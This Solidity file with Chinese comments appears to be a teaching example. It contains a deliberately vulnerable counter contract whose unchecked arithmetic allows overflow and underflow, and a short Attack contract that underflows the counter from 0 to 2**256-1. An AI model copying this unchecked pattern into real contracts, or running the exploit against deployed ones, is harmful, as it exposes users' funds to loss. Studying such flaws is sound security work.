// Solidity 版本標示為 >=0.8.0
// 這份程式碼展示了一個 Overflow 與 Underflow 漏洞，
// 漏洞發生在使用 unchecked 區塊進行加減運算時，沒有檢查數值是否會溢位或下溢。

pragma solidity >=0.8.0;

// 漏洞合約：VulnerableCounter
// 此合約中的 increment 與 decrement 函式均使用 unchecked 區塊，
// 因此若輸入數值超出預期範圍，就可能導致數值溢位或下溢（overflow/underflow）。
contract VulnerableCounter {
    // 漏洞重點：該 state 變數沒有額外保護，可能因為 underflow/overflow 出現錯誤結果
    uint256 public counter;

    // 漏洞函式：增加 counter 的值，未檢查 overflow 風險
    function increment(uint256 value) public {
        unchecked {
            // 漏洞重點：若 value 太大，則可能發生溢位 overflow
            counter += value;
        }
    }

    // 漏洞函式：減少 counter 的值，未檢查 underflow 風險
    function decrement(uint256 value) public {
        unchecked {
            // 漏洞重點：若 value 大於 counter，將會導致 underflow，counter 變成非常大的數值
            counter -= value;
        }
    }
}

// 攻擊合約：Attack
// 攻擊者可藉由呼叫 attack()，利用 underflow 漏洞使 counter 由 0 下溢，
// 從而取得一個極大值，可進一步利用合約內的其他邏輯進行攻擊。
// 攻擊流程：
// 1. 部署 VulnerableCounter 合約，counter 預設為 0。
// 2. 攻擊者部署 Attack 合約，並傳入 VulnerableCounter 合約的地址。
// 3. 攻擊者呼叫 attack()，執行 vulnerable.decrement(1) 時，因 counter 為 0 而 underflow，
//    使得 counter 變成 2**256 - 1。
contract Attack {
    VulnerableCounter public vulnerable;

    constructor(address _vulnerable) {
        vulnerable = VulnerableCounter(_vulnerable);
    }

    // 利用 underflow 攻擊：當 counter 為 0 時，執行下面的操作會使 counter 下溢
    function attack() public {
        vulnerable.decrement(1);
    }
}
